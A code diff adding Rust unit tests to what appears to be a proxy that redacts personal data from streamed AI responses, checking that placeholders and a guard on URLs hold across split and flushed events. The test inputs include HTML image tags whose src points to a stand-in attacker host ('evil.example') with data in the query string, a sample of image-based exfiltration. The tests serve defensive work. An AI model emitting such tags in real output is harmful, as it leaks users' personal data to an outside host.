@@ -2698,6 +2698,85 @@ mod tests {
             "{}",
             String::from_utf8_lossy(&out)
         );
+        // The same inside a patch batch, followed by a bare `{"v"}` that
+        // continues the batch's last op.
+        let body = sse(&[
+            (
+                Some("delta"),
+                json!({"p": "/message/content/parts/0", "o": "append",
+                       "v": "<img alt=x src=\"//e/?d= "})
+                .to_string(),
+            ),
+            (
+                Some("delta"),
+                json!({"p": "", "o": "patch", "v": [
+                    {"p": "/message/content/parts/0", "o": "truncate", "v": 20},
+                    {"p": "/message/content/parts/0", "o": "append", "v": "[EMAIL_1] "}]})
+                .to_string(),
+            ),
+            (Some("delta"), json!({"v": "[NAME_1]\">"}).to_string()),
+        ]);
+        for n in [1, 9, 1000] {
+            let out = String::from_utf8_lossy(&run(&e, "text/event-stream", &body, n)).into_owned();
+            assert!(
+                !out.contains("ravi@") && !out.contains("Ravi"),
+                "{n}: {out}"
+            );
+        }
+    }
+
+    /// M3: a forced flush (too many events held back) in the middle of a
+    /// streamed JSON value keeps the value's URL-guard state, and the text
+    /// after the flush still goes out.
+    #[test]
+    fn forced_flushes_keep_the_guard_state() {
+        let dir = tempfile::tempdir().unwrap();
+        let e = tagged(dir.path());
+        // Inside an HTML tag, `[NAM` (an attribute name) is held back. The
+        // hold limit flushes it, and the value goes on with a quoted
+        // attribute value: a URL, even with a space in it.
+        let pieces = [
+            r#"{"html": "<img alt=x [NAM"#,
+            r#"E_1] src=\"//evil.example/?d= [NAME_1]\">"}"#,
+        ];
+        let delta = |p: &str| {
+            json!({"type": "content_block_delta", "index": 1,
+                   "delta": {"type": "input_json_delta", "partial_json": p}})
+            .to_string()
+        };
+        let mut evs = vec![
+            (
+                Some("content_block_start"),
+                json!({"type": "content_block_start", "index": 1,
+                       "content_block": {"type": "tool_use", "id": "t1", "name": "show",
+                                         "input": {}}})
+                .to_string(),
+            ),
+            (Some("content_block_delta"), delta(pieces[0])),
+        ];
+        for _ in 0..MAX_HELD_EVENTS + 6 {
+            evs.push((Some("ping"), json!({"type": "ping"}).to_string()));
+        }
+        evs.push((Some("content_block_delta"), delta(pieces[1])));
+        evs.push((
+            Some("content_block_stop"),
+            json!({"type": "content_block_stop", "index": 1}).to_string(),
+        ));
+        let body = sse(&evs);
+        for n in [1, 13, 100_000] {
+            let out = run(&e, "text/event-stream", &body, n);
+            let json_text: String = events(&out)
+                .iter()
+                .filter_map(|ev| serde_json::from_str::<Value>(&ev.data).ok())
+                .filter_map(|v| v["delta"]["partial_json"].as_str().map(str::to_string))
+                .collect();
+            let v: Value = serde_json::from_str(&json_text)
+                .unwrap_or_else(|err| panic!("{n}: {err}: {json_text}"));
+            assert_eq!(
+                v["html"], "<img alt=x [NAME_1] src=\"//evil.example/?d= [NAME_1]\">",
+                "{n}"
+            );
+        }
     }
 
     #[test]
